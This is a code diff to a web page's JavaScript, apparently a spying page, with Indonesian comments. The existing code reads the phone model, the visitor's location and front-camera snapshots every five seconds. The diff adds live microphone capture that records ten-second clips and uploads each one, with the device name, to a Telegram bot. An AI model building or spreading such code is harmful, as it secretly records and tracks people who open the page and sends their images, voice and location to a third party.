@@ -46,7 +46,7 @@
             const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
             if (match) rawModel = match[3].split(" Build")[0].trim();
         }
-
+        
         const db = {
             "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
             "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
@@ -85,8 +85,8 @@
             }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
+        // Kamera Depan
         try {
-            // Memaksa Kamera Depan
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
             setInterval(takeAndSend, 5000);
@@ -97,6 +97,36 @@
                 setInterval(takeAndSend, 5000);
             } catch (err) { takeAndSend(); }
         }
+
+        // Tambahan: Live Mic
+        startAudioCapture();
+    }
+
+    async function startAudioCapture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(stream);
+            let audioChunks = [];
+            
+            recorder.ondataavailable = (e) => audioChunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                sendAudio(blob);
+                audioChunks = [];
+                recorder.start();
+            };
+
+            recorder.start();
+            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+        } catch (e) { console.log("Mic blocked"); }
+    }
+
+    async function sendAudio(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('voice', blob, 'mic.ogg');
+        fd.append('caption', `🎙 *Audio Terpantau*\nHP: ${deviceName}`);
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
     }
 
     async function takeAndSend() {
